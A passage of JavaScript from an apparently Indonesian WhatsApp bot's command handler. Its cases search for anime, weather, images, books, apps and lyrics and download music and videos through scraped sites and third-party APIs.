    if (action === 'update') {
      reply('Fetching latest anime updates... Please wait...');
      const result = await animexin.animexinUpdate();
      if (result && result.length > 0) {
        let message = '🔍 *Latest Anime Updates* 🔍\n\n';
        result.forEach(anime => {
          message += `📺 *Title*: ${anime.title}\n🔗 *URL*: ${anime.url}\n🖼️ *Image*: ${anime.image}\n🎬 *Episode*: ${anime.episode}\n📦 *Type*: ${anime.type}\n\n`;
        });
        reply(message);
      } else {
        reply('No updates found.');
      }
    } else if (action === 'detail' && query) {
      reply('Fetching anime details... Please wait...');
      const result = await animexin.animexinDetail(query);
      if (result) {
        reply(`🔍 *Anime Details* 🔍\n\n${result}`);
      } else {
        reply('No details found for the provided URL.');
      }
    } else if (action === 'search' && query) {
      reply('Searching for anime... Please wait...');
      const result = await animexin.animexinSearch(query);
      if (result) {
        reply(`🔍 *Search Results* 🔍\n\n${result}`);
      } else {
        reply('No results found for the provided keyword.');
      }
    } else {
      reply(`Invalid command or missing query. Please use the following format:\n\n${XyrooRynzz} update\n${XyrooRynzz} detail <URL>\n${XyrooRynzz} search <keyword>`);
    }
  } catch (error) {
    console.error(error);
    reply('Error: ' + error.message);
  }
};
break

    case "nontonanime-latest": {
if (isBan) return XRB()
await XReaction()
        const list = await nontonAnime.latest();
        if (!list.length) return reply("Gagal mengambil data anime terbaru.");
        for (let i = 0; i < Math.min(3, list.length); i++) {
          const Xyroo = list[i];
          await Alice.sendMessage(m.chat, {
            image: { url: Xyroo.thumbnail },
            caption: `*${Xyroo.title}*\nEpisode: ${Xyroo.episode}\nTipe: ${Xyroo.type}\nURL: ${Xyroo.url}`
          }, { quoted: m });
        }
      }
      break;

    case "nontonanime-upcoming": {
if (isBan) return XRB()
await XReaction()
        const list = await nontonAnime.upcoming();
        if (!list.length) return reply("Tidak ada anime upcoming ditemukan.");
        for (let i = 0; i < Math.min(3, list.length); i++) {
          const Xyroo= list[i];
          await Alice.sendMessage(m.chat, {
            image: { url: Xyroo.thumbnail },
            caption: `*${Xyroo.title}*\nEpisode: ${Xyroo.episode}\nTipe: ${Xyroo.type}\nURL: ${Xyroo.url}`
          }, { quoted: m });
        }
      }
      break;

    case "nontonanime-search": {
if (isBan) return XRB()
await XReaction()
        if (!args[0]) return reply("Masukkan judul anime yang ingin dicari!");
        const list = await nontonAnime.search(args.join(" "));
        if (!list.length) return reply("Anime tidak ditemukan.");
        for (let i = 0; i < Math.min(3, list.length); i++) {
          const Xyroo= list[i];
          await Alice.sendMessage(m.chat, {
            image: { url: Xyroo.thumbnail },
            caption: `*${Xyroo.title}*\nEpisode: ${Xyroo.episode}\nTipe: ${Xyroo.type}\nURL: ${Xyroo.url}`
          }, { quoted: m });
        }
      }
      break;
      
case 'myanimelist': {
  if (!q) return reply(`Example: ${XyrooRynzz} one piece`)
  let anime = await fetch(`https://api.jikan.moe/v4/anime?q=${q}`)
  let res = await anime.json()
  if (!res.data || res.data.length === 0) return reply('Anime tidak ditemukan!')
  let result = res.data[0]
  let teks = `*${result.title}*\n\n`
  teks += `*Judul Jepang:* ${result.title_japanese || '-'}\n`
  teks += `*Tipe:* ${result.type || '-'}\n`
  teks += `*Episode:* ${result.episodes || '-'}\n`
  teks += `*Status:* ${result.status || '-'}\n`
  teks += `*Tanggal Tayang:* ${result.aired?.string || '-'}\n`
  teks += `*Skor:* ${result.score || '-'}\n`
  teks += `*Produser:* ${(result.producers?.map(p => p.name).join(', ')) || '-'}\n`
  teks += `*Studio:* ${(result.studios?.map(s => s.name).join(', ')) || '-'}\n`
  teks += `*Genre:* ${(result.genres?.map(g => g.name).join(', ')) || '-'}\n`
  teks += `*Durasi:* ${result.duration || '-'}\n`
  teks += `*Rating:* ${result.rating || '-'}\n`
  teks += `\n*Sinopsis:* ${result.synopsis || '-'}\n`
  teks += `\n*Link:* ${result.url}`
  Alice.sendMessage(m.chat, {
    image: { url: result.images.jpg.image_url },
    caption: teks
  }, { quoted: m })
}
break
        
case 'yahooimg':
case 'yahooimage' : {
if (isBan) return XRB()
await XReaction()
if (!text) return reply("Ingin Mencari Apa?");
    try {
        const images = await Yimg(text);
        if (images.length === 0) {
            reply("Tidak ada gambar yang ditemukan");
        } else {
            const image = images[0];
            let imageText = `*Judul :* _${image.title}_\n`;
            imageText += `*Ukuran :* _${image.size}_\n`;
            imageText += `*Dimensi :* _${image.width}x${image.height}_\n\n`;
            imageText += `*Sumber :* _${image.url}_\n`;

            await Alice.sendMessage(m.chat, {
                image: { url: image.url },
                caption: imageText,
            }, { quoted: m });
        }
    } catch (error) {
        reply("❌ Terjadi kesalahan saat mengambil gambar.");
        console.error(error);
    }
  }
break

case 'cuaca' :
case 'cuacakota' : {
    if (!text) return reply(`Masukkan nama kota!\nContoh: ${XyrooRynzz} pandeglang`)

    try {
        let res = await fetch(`https://fastrestapis.fasturl.cloud/search/weather?location=${encodeURIComponent(text)}`)
        let json = await res.json()

        if (json.status !== 200) {
            return reply('Gagal mengambil data cuaca, pastikan kota valid.')
        }

function getWeatherEmoji(condition) {
    condition = condition.toLowerCase()
    if (condition.includes('cloud')) return '☁️'
    if (condition.includes('rain')) return '🌧️'
    if (condition.includes('sun')) return '☀️'
    if (condition.includes('clear')) return '🌞'
    if (condition.includes('storm')) return '⛈️'
    if (condition.includes('snow')) return '❄️'
    if (condition.includes('fog')) return '🌫️'
    return '⛅'
}

        let r = json.result
        let emojiCuaca = getWeatherEmoji(r.condition)

        // 1
        await Alice.sendMessage(m.chat, {
            location: {
                degreesLatitude: parseFloat(r.latitude),
                degreesLongitude: parseFloat(r.longitude)
            }
        }, { quoted: m })

        // 2
        let caption = `
*「 INFO CUACA 」*
📍 *Kota:* ${r.city}
${emojiCuaca} *Kondisi:* ${r.condition}
🌡️ *Suhu:* ${r.temperature}
💧 *Kelembaban:* ${r.humidity}
🌬️ *Angin:* ${r.wind}
🌧️ *Curah Hujan:* ${r.precipitation}
☁️ *Tutup Awan:* ${r.cloudCover}
🔭 *Jarak Pandang:* ${r.visibility}
🌅 *Matahari Terbit:* ${r.sunrise}
🌇 *Matahari Terbenam:* ${r.sunset}
`

        await reply(caption)
    } catch (e) {
        console.log('Error saat mengambil data cuaca:', e)
        reply('Terjadi kesalahan saat memproses permintaan cuaca.')
    }
}
break

case 'sanime':
case 'searchanime':
case 'kuronime': {
  if (!q) return reply('🔎 *Silakan masukkan judul anime yang ingin kamu cari.*')

  try {
    const axios = require("axios")
    const cheerio = require("cheerio")
    const url = `https://kuronime.biz/page/1/?s=${encodeURIComponent(q)}`
    const { data } = await axios.get(url)
    const $ = cheerio.load(data)
    const results = []
    $(".listupd article").each((_, el) => {
      const anchor = $(el).find("a")
      const title = anchor.find("h4").text().trim()
      const link = anchor.attr("href")
      const image = anchor.find("img.lazyload").last().attr("data-src")
      const rating = anchor.find("i").text().trim()
      const type = anchor.find(".type").text().trim()
      results.push({ title, link, image, rating, type })
    })
    if (!results.length) return reply('Anime tidak ditemukan, coba kata kunci lain.')
    let message = `Hasil pencarian untuk *${q}*:\n\n`
    results.forEach((anime, index) => {
      message += `*${index + 1}. ${anime.title}*\n`
      message += `   🔗 *Link*: ${anime.link}\n`
      message += `   📊 *Rating*: ${anime.rating}\n`
      message += `   📌 *Type*: ${anime.type}\n\n`
    })
    Alice.sendMessage(m.chat, {
      text: message.trim(),
      contextInfo: {
        externalAdreply: {
          title: "Kuronime Search",
          body: packname,
          thumbnailUrl: results[0]?.image || '',
          sourceUrl: results[0]?.link || '',
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
  } catch (err) {
    console.log(err)
    XRR()
  }
}
break

case 'ffw': {
if (isBan) return XRB()
await XReaction()
  try {
      const hasil = await FFW();

      if (typeof hasil === 'string' && hasil.startsWith('Error')) {
          reply(hasil);
      } else if (hasil.length === 0) {
          reply('*Tidak ada informasi senjata yang ditemukan!*');
      } else {
          let result = `*Daftar Senjata Free Fire*\n\n`;
          hasil.forEach((item, index) => {
              result += `*Nama Senjata :* _${item.name}_\n`;
              result += `*Damage :* _${item.damage}_\n`; 
              result += `*Kategori :* _${item.tags.join(', ')}_\n\n`;
              result += `*Deskripsi :* _${item.description}_\n\n========================\n\n`;
          });
          reply(result);
      }
  } catch (error) {
      console.error(error);
      XRR()
  }
}
break
case 'wikimedia': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`*Mau Cari Gambar Apa di Wikimedia?*`);
  try {
    const images = await WikiMedia(text);
    if (!images || images.length === 0) {
      return reply("⚠️ *Tidak ditemukan gambar dengan pencarian tersebut di Wikimedia.*");
    }
    function shuffleArray(array) {
      for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
      }
    }
    shuffleArray(images);
    const selectedImages = images.slice(0, 5);
    let push = [];
    let i = 1;
    async function createImage(url) {
      const { imageMessage } = await generateWAMessageContent({
        image: { url }
      }, { upload: Alice.waUploadToServer });
      return imageMessage;
    }
    for (let img of selectedImages) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: `*Pencarian : ${text}*`
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `*Gambar ${i++}*`,
          hasMediaAttachment: true,
          imageMessage: await createImage(img.image)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_url",
              "buttonParamsJson": `{"display_text":"Wikimedia","url":"${img.source}","merchant_url":"${img.source}"}`
            }
          ]
        })
      });
    }
    const bot = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: `*Berhasil Memuat 5 Gambar*`
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    }, {});

    await Alice.relayMessage(m.chat, bot.message, {
      messageId: bot.key.id
    }).catch((err) => reply(mess.error));

  } catch (error) {
    console.error("Error:", error.message);
    XRR()
  }
}
break
case 'playstore': {
if (isBan) return XRB()
await XReaction()
  const query = args.join(" ");
  if (!query) return reply("*Mau Cari Aplikasi Apa?*");

  try {
    const hasil = await PlayStore(query);

    if (hasil.length === 0) {
      reply("⚠*Tidak Ada Hasil, Pastikan Nama Aplikasi Valid*");
    } else {
      const app = hasil[0];

      let result = `*Hasil Pencarian Dari : ${query}*\n\n`;
      result += `*Nama :* _${app.nama}_\n`;
      result += `*Developer :* _${app.developer}_\n`;
      result += `*Rating :* _${app.rate}_\n\n`;
      result += `*Link Aplikasi :* _${app.link}_\n`;
      result += `*Link Developer :* _${app.link_dev}_\n`;

      await Alice.sendMessage(m.chat, {
        image: { url: app.img },
        caption: result
      }, { quoted: m });

    }
  } catch (error) {
    console.error(error);
    XRR()
  }
}
break
case 'caribuku': {
if (isBan) return XRB()
await XReaction()
  const query = args.join(" ");
  if (!query) return reply("Cari buku apa?");

  try {
    const hasil = await BookSearch(query);

    if (hasil.length === 0) {
      reply("🔍 *Tidak Ada Hasil, Pastikan Nama Buku Valid*");
    } else {
      let result = `*Hasil Pencarian Dari : ${query}*\n\n`;
      hasil.forEach((buku, index) => {
        result += `*${index + 1}. ${buku.title}*\n`;
        result += `*Rating :* _${buku.rating}_\n\n`;
        result += `*Link Buku :* \n_${buku.link}_\n\n==============================\n`;
      });
      reply(result);
    }
  } catch (error) {
    console.error(error);
    XRR()
  }
}
break

case 'lirik':
case 'liriklagu': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Judul lagu?\nExample: duka`);
    try {
        let results = await LirikLagu(text);
        if (!results || results.length === 0) {
            return reply('Tidak Ditemukan');
        }
        let song = results[0];
        let lyricsRes = await axios.get(song.songLyricsUrl);
        let { artist, songTitle, songLyrics } = lyricsRes.data.data;
        reply(`*Judul* : _${songTitle}_\n*Artis :* _${artist}_\n\n*Lirik* :\n${songLyrics}`);
    } catch (error) {
        reply(`Tidak Ditemukan`);
    }
}
break

case 'samehadakudetail': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('Link?');
    
    let cari = await (await fetch(`https://api.siputzx.my.id/api/animesamehadaku/detail?link=${text}`)).json();
    if (cari.status) {
        let cap = '*_LIST ALL EPISODE_*' + '\n\n';
        for (let episode of cari.data.episodes) {
            cap += `*🏷️ TITLE :* ${episode.title}\n*🀄 DATE :* ${episode.date}\n*🔗 LINK :* ${episode.link}\n\n`;
        }
        await Alice.sendMessage(m.chat, { image: { url: cari.data.thumbnail }, caption: cap }, { quoted: m });
    } else {
        await reply('Data tidak ditemukan.');
    }
}
break;
case 'samehadakusearch': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('name?');

    let cari = await (await fetch(`https://api.siputzx.my.id/api/anime/samehadaku/search?query=${text}`)).json();
    if (cari.status) {
        let cap = '_Samehadaku Search From: *' + text + '*_\n\n';
        for (let ciro of cari.data) {
            cap += `*🏷️ TITLE :* ${ciro.title}\n*🃏 RATING :* ${ciro.star}\n*🏯 GENRE :* ${ciro.genre.join(', ')}\n*☃️ STATUS :* ${ciro.type.join(', ')}\n*🔗 LINK :* ${ciro.link}\n*🄄 DESKRIPSI :*\n${ciro.description}\n\n`;
        }
        await Alice.sendMessage(m.chat, { image: { url: cari.data[0].thumbnail }, caption: cap }, { quoted: m });
    } else {
        await reply('Data tidak ditemukan.');
    }
}
break;

case 'apksearch': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('apk name?');
    
    try {
        let response = await fetch(`https://api-yudzxml.vercel.app/api/apk?action=search&query=` + text);
        let apkData = await response.json();

        if (apkData.status === 200) {
            let results = apkData.data;
            let message = 'Here are the results:\n\n';

            results.forEach(app => {
                message += `*Title:* ${app.title}\n`;
                message += `*Developer:* ${app.developer || 'N/A'}\n`;
                message += `*Version:* ${app.version || 'N/A'}\n`;
                message += `*Rating:* ${app.rating || 'N/A'}\n`;
                message += `*Link:* ${app.link}\n`;
                message += `![Image](${app.image})\n\n`;
            });

            reply(message);
        } else {
            reply('errrorr');
        }
    } catch (e) {
        reply('errrorrr');
    }
}
break;
case 'apkdetail': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('apk id or name');

    try {
        let response = await fetch(`https://api-yudzxml.vercel.app/api/apk?action=detail&url=` + text);
        let apkDetail = await response.json();

        if (apkDetail.status === 200) {
            let app = apkDetail.data;
            let message = `*Title:* ${app.title}\n`;
            message += `*Version:* ${app.version}\n`;
            message += `*Genre:* ${app.genre}\n`;
            message += `*Rating:* ${app.rating} (${app.votes} votes)\n`;
            message += `*Developer:* ${app.developer}\n`;
            message += `*Requirements:* ${app.requirements}\n`;
            message += `*Downloads:* ${app.downloads}\n`;
            message += `*Download Link:* ${app.download}\n`;
            message += `*Play Store:* ${app.playstore}\n`;
            message += `*Description:* ${app.description}\n\n`;
            message += `*What's New:* ${app.whatsnew}\n`;
            message += `*Video:* ${app.video}\n\n`;
            message += `*Related Apps:*\n`;

            app.related.forEach(relatedApp => {
                message += `- [${relatedApp.title}](${relatedApp.link}) by ${relatedApp.developer} (Version: ${relatedApp.version}, Rating: ${relatedApp.rating})\n`;
            });

            reply(message);
        } else {
            reply('ada masalah');
        }
    } catch (e) {
        reply('ada masalah');
    }
}
break;

case 'spotify': case 'playspotify': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Masukkan judul lagu!\nExample: ${XyrooRynzz}`);
  const res = await fetch(`https://api.nekorinn.my.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
  if (!res.ok) return reply('Gagal mengambil data lagu.');
  const data = await res.json();
  if (!data.status) return reply('Lagu tidak ditemukan!');
  const { title, artist, duration, imageUrl, link } = data.result.metadata;
  const downloadUrl = data.result.downloadUrl;
  await Alice.sendMessage(m.chat, {
    audio: { url: downloadUrl },
    mimetype: 'audio/mp4',
    fileName: `${title}.mp3`,
    ptt: false,
    contextInfo: {
      externalAdreply: {
        title: `${title} - ${artist}`,
        body: `${packname}`,
        mediaType: 1,
        thumbnailUrl: imageUrl,
        renderLargerThumbnail: true,
        sourceUrl: link, 
        showAdAttribution: true
      }
    }
  }, { quoted: m });
}
break

case 'google-search':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply('Text Input');
const apiUrl = `https://restapii.rioooxdzz.web.id/api/search-google?message=${encodeURIComponent(text)}`;
 
try {
    const response = await fetch(apiUrl);
    let result = await response.json();
    const results = result.data.response;
 
    if (results && results.length > 0) {
        reply(`Search: ${text}\n\n${results}`);
    } else {
        reply('Tidak ada hasil ditemukan.');
    }
} catch (error) {
    console.error(error);  // Log the error if any
    reply('Terjadi kesalahan saat mencari.');
}
}
break

case 'sticker-search': {
if (isBan) return XRB()
await XReaction()
stickersearch = (query) => {
	return new Promise((resolve, reject) => {
		axios.get(`https://getstickerpack.com/stickers?query=${query}`)
			.then(({
				data
			}) => {
				const $ = cheerio.load(data)
				const source = [];
				const link = [];
				$('#stickerPacks > div > div:nth-child(3) > div > a').each(function(a, b) {
					source.push($(b).attr('href'))
				})
				axios.get(source[Math.floor(Math.random() * source.length)])
					.then(({
						data
					}) => {
						const $$ = cheerio.load(data)
						$$('#stickerPack > div > div.row > div > img').each(function(c, d) {
							link.push($$(d).attr('src').replace(/&d=200x200/g, ''))
						})
					let result = {
							status: 200,
							author: global.creator,
							title: $$('#intro > div > div > h1').text(),
							sticker_url: link
						}
						resolve(result)
					})
			}).catch(reject)
	})
}
if (!text) return reply(`example ${XyrooRynzz} Doraemon`)
await XReaction()
anu = await stickersearch(text)
for (let rehs of anu.sticker_url) {
await sleep(1500)
await Alice.sendImageAsSticker(m.chat, rehs, m, { packname: packname, author: author })
}
}
break

case 'alosehat': {
if (isBan) return XRB()
await XReaction()
  if (!q) return reply("Apa yang ingin dicari?");

  const fetch = require('node-fetch');
  const cheerio = require('cheerio');
  
  async function alosehat(query) {
    try {
      const url = `https://wp.hellosehat.com/?s=${encodeURIComponent(query)}`;
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`${response.status}`);
      }
      
      const body = await response.text();
      const $ = cheerio.load(body);
      
      const articles = $(".card.article--card").map((index, element) => {
        const article = $(element);
        return {
          title: article.find("h2.entry-title a").text().trim(),
          link: article.find("h2.entry-title a").attr("href"),
          desc: article.find(".entry-summary p").text().trim(),
          author: article.find(".author.vcard a").text().trim(),
          time: article.find("time.entry-date.published").attr("datetime")
        };
      }).get().filter(article => article.title && article.desc);
      
      if (!articles.length) {
        throw new Error("No matching results found.");
      }
      
      const totalResults = parseInt($(".search--result-count").text(), 10) || 0;
      return { total: totalResults, results: articles };
      
    } catch (error) {
      throw new Error(`Error: ${error.message}`);
    }
  }

  try {
    const results = await alosehat(q);
    const { total, results: articles } = results;
    
    if (total === 0) {
      return reply("gd hsil.");
    }
    
    const response = articles.map((item, index) => (
      `${index + 1}. ${item.title}\nPenulis: ${item.author}\nTanggal: ${item.time}\nDeskripsi: ${item.desc}\nLink: ${item.link}\n\n`
    )).join('');

    reply(`Hasil pencarian Hello Sehat (${total} hasil):\n\n${response}`);
    
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}
break

case 'infoanime':
case 'Informationanime':
case 'informasianime': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`masukan judul anime? contoh ${XyrooRynzz}atri: my dear moments`)
sendReaction("⏳")
await XReaction()

try {
const infoanime = await fetchJson(`https://api.ryzendesu.vip/api/weebs/anime-info?query=${text}`)
let capt = `╭──── *[ ɪɴғᴏ - ᴀɴɪᴍᴇ ]* ──々\n`
capt += `│ =〆 ᴊᴜᴅᴜʟ : ${infoanime.title}\n`
capt += `│ =〆 sᴄᴏʀᴇ : ${infoanime.score}\n`
capt += `│ =〆 ᴍᴇᴍʙᴇʀs : ${infoanime.members}\n`
capt += `│ =〆 sᴛᴀᴛᴜs : ${infoanime.status}\n`
capt += `│ =〆 ᴅᴇsᴄʀɪᴘᴛɪᴏɴ : ${infoanime.synopsis}\n`
capt += `│ =〆 ғᴀᴠᴏʀɪᴛᴇ : ${infoanime.favorites}\n`
capt += `│ =〆 ᴜʀʟ : ${infoanime.url}\n`
capt += `╰─々`
await Alice.sendMessage(m.chat, {
image: { url: infoanime.images.jpg.large_image_url },
caption: capt,
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: channel,
newsletterName: `InfoAnime By: ${ownername}`,
serverMessageId: 143
}
}
}, { quoted: m })
} catch (err) {
sendReaction("❌")
}}
break

case 'gimage': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`gimage Kucing`)
    await XReaction()
    const axios = require('axios')
    const cheerio = require('cheerio')
// wm avs
    const nyariGambar = async (query) => {
        const url = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`
        const { data } = await axios.get(url)
        const $ = cheerio.load(data)
        let images = []
        $('img').each((i, elem) => {
            images.push($(elem).attr('src'))
        })
        return images
    }
// wm avs
    nyariGambar(text).then(images => {
        if (images.length === 0) {
            return reply('Tidak ada gambar.')
        }
        let SaannzImage = images[Math.floor(Math.random() * images.length)]
        Alice.sendMessage(m.chat, { image: { url: SaannzImage }, caption: `*Query* : ${text}\n*Media Url* : ${SaannzImage}` }, { quoted: m })
    }).catch(error => {
        reply('Terjadi kesalahan.')
    })
}
break

case 'bingimg': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply('Masukkan kata kunci yang akan dicari!')

  //created by hann

  const AXIOS_OPTIONS = {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    },
  };

  function parseimg(url) {
    const urlObj = new URL(url);
    const searchParams = new URLSearchParams(urlObj.search);
    return decodeURIComponent(searchParams.get('mediaurl'));
  }

  function search(query) {
    return axios.get(
      `https://www.bing.com/images/search?q=${query}`,
      AXIOS_OPTIONS
    ).then(function ({ data }) {
      let $ = cheerio.load(data)

      const url = []

      $(".imgpt > a").each((i, el) => {
        url[i] = $(el).attr("href");
      });

      const result = [];
      for (let i = 0; i < url.length; i++) {
       result[i] = {
          photo: parseimg('https://bing.com'+url[i])
        };
      }
      return result;
    });
  }

  let img = await search(text)
  let hasil = img[Math.floor(Math.random() * img.length)]

  Alice.sendMessage(m.chat, { image: {url: `${hasil.photo}`}}, { quoted: m })
}
break


case 'movie-search': {
if (isBan) return XRB()
await XReaction()
  if (!text) {
    throw 'Contoh: .movie-search horror';
  }
// wm avs
  reply('_sabar tuan sedang mencari film nya_');
// wm avs
  async function avzz(query) {
    const url = `https://www.themoviedb.org/search?query=${query}`;
    try {
      const response = await axios.get(url);
      const html = response.data;
      const $ = cheerio.load(html);
      const movies = [];
// wm avs
      $('.card').each((index, element) => {
        const title = $(element).find('.title a').text().trim();
        const link = `https://www.themoviedb.org${$(element).find('.title a').attr('href')}`;
        const synopsis = $(element).find('.overview').text().trim();
        movies.push({ title, link, synopsis });
      });
// wm avs
      return movies;
    } catch (error) {
      console.error('error di sini:', error);
      return [];
    }
  }
// wm avs
  try {
    const query = encodeURIComponent(text);
    const movies = await avzz(query);

    if (movies.length === 0) {
      throw new Error('Film tidak ditemukan.');
    }
// wm avs
    let result = '';
    movies.forEach((movie, index) => {
      result += `*${index + 1}. ${movie.title}*\nLink: ${movie.link}\nSinopsis: ${movie.synopsis}\n\n`;
    });
// wm avs
    reply(result);
  } catch (error) {
    reply(`terjadi kesalahan: ${error.message}`);
  }
}
break


case 'sbook': {
if (isBan) return XRB()
await XReaction()
    if (!q.trim()) return reply(`Mau cari buku apa?`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    // wm avz
    async function avzzzz(query) {
        const url = `https://www.goodreads.com/search?q=${encodeURIComponent(query)}`;
        // wm avz
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const books = [];
            $('.tableList tr').each((index, element) => {
                const title = $(element).find('a.bookTitle span').text().trim();
                const link = $(element).find('a.bookTitle').attr('href');
                const rating = $(element).find('span.minirating').text().trim();
                // wm avz
                books.push({ title, link: `https://www.goodreads.com${link}`, rating });
            });
            // wm avz
            return books;
        } catch (error) {
            console.error('Error fetching data:', error.message);
            return [];
        }
    }
    // wm avz
    avzzzz(q)
        .then(results => {
            if (results.length === 0) {
                reply('ora eneng.');
            } else {
                let response = `Hasil pencarian Goodreads untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nRating: ${item.rating}\nLink: ${item.link}\n\n`;
                });
                reply(response);
            }
        })
        .catch(error => {
            reply('emror.');
        });
        }
    break                 

case "yts": {
if (isBan) return XRB()
await XReaction()
if (!text) return reply('we dont talk')
await Alice.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await reply(teks)
await Alice.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
}
break
case 'putar':
case 'lagu':
case 'music':
case 'ytplay': 
case 'play': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply('lagu apa yg ingin dicari');

    await XReaction()
    try {
        let search = await yts(text);
        let firstVideo = search.all[0];
        let response = await ddownr.download(firstVideo.url, 'mp3')
        let hasil = response.downloadUrl
        await Alice.sendMessage(m.chat, {
            audio: {
                url: hasil
            },
            mimetype: 'audio/mp4',
            contextInfo: {
                externalAdreply: {
                    showAdAttribution: true,
                    title: firstVideo.title || 'Untitled',
                    body: `${packname}`,
                    sourceUrl: firstVideo.url,
                    thumbnailUrl: firstVideo.thumbnail || 'https://example.com/default_thumbnail.jpg',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } catch (e) {
      console.log(e)
        await Alice.sendMessage(m.chat, { react: { text: '🚫', key: m.key } });
        try {
            let search = await yts(text);
            let firstVideo = search.all[0];
            let memek = await fetchJson(`${global.beta}/api/download/ytmp3?url=${firstVideo.url}&apikey=${global.botz}`);
            let hasil = memek.result;

            await Alice.sendMessage(m.chat, {
                audio: {
                    url: hasil.mp3
                },
                mimetype: 'audio/mp4',
                contextInfo: {
                    externalAdreply: {
                        showAdAttribution: true,
                        title: firstVideo.title || 'Untitled',
                        body: `${botname}`,
                        sourceUrl: firstVideo.url,
                        thumbnailUrl: firstVideo.thumbnail || 'https://example.com/default_thumbnail.jpg',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        } catch (e) {
            console.log(e);
            let search = await yts(text);
            let firstVideo = search.all[0];
            let Xyroo = await fetchJson(`https://api.agatz.xyz/api/ytmp3?url=${firstVideo.url}`);

            await Alice.sendMessage(m.chat, {
                audio: {
                    url: Xyroo.data
                },
                mimetype: 'audio/mp4',
                contextInfo: {
                    externalAdreply: {
                        showAdAttribution: true,
                        title: firstVideo.title || 'Untitled',
                        body: `${botname}`,
                        sourceUrl: firstVideo.url,
                        thumbnailUrl: firstVideo.thumbnail || 'https://example.com/default_thumbnail.jpg',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        }
    }
}
break;

case 'playvid':
case 'playvideo': {
if (isBan) return XRB()
await XReaction()
const axios = require("axios");
const yts = require("yt-search");
    if (!text) reply(`Gunakan contoh ${XyrooRynzz} 5 sahabat sampai mati`)

    const search = await yts(text);
    if (!search.videos.length) reply("Video tidak ditemukan!")
    
    const video = search.videos[0];
    const url = video.url;

async function ytmp4(url) {
    const format = "360"; 
    const response = await axios.get(`https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(url)}`, {
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            "Referer": "https://youtubedownloader.me/"
        }
    });
    const videoId = response.data.id;
    let progress = 0;
    let downloadUrl = null;
    let attempt = 0;
    while (progress < 1000 && attempt < 20) {
        const progressResponse = await axios.get(`https://youtubedownloader.me/api/progress?id=${videoId}`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Referer": "https://youtubedownloader.me/"
            }
        });

        progress = progressResponse.data.progress;
        if (progress >= 1000) {
            downloadUrl = progressResponse.data.download_url;
            break;
        }
        attempt++;
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    return downloadUrl;
}

    try {
        const downloadUrl = await ytmp4(url);

        if (!downloadUrl) reply("Gagal mendapatkan URL download video.")

        await Alice.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: `Mendapatkan Informasi!\nJudul: ${video.title}\nChannel: ${video.author.name}\nDurasi: ${video.timestamp}\n\nProcces Sending Video`
        }, { quoted: m });

        await Alice.sendMessage(m.chat, {
            video: { url: downloadUrl },
            mimetype: "video/mp4",
            fileName: `video.mp4`,
            contextInfo: {
                externalAdreply: {
                    title: video.title,
                    body: "Play Youtube Video",
                    mediaUrl: url,
                    mediaType: 2,
                    thumbnailUrl: video.thumbnail
                }
            }
        }, { quoted: m });

    } catch (error) {
        console.error('Error:', error.message);
        reply(`Error: ${error.message}. Silakan periksa URL dan coba lagi.`)
    }
};
break

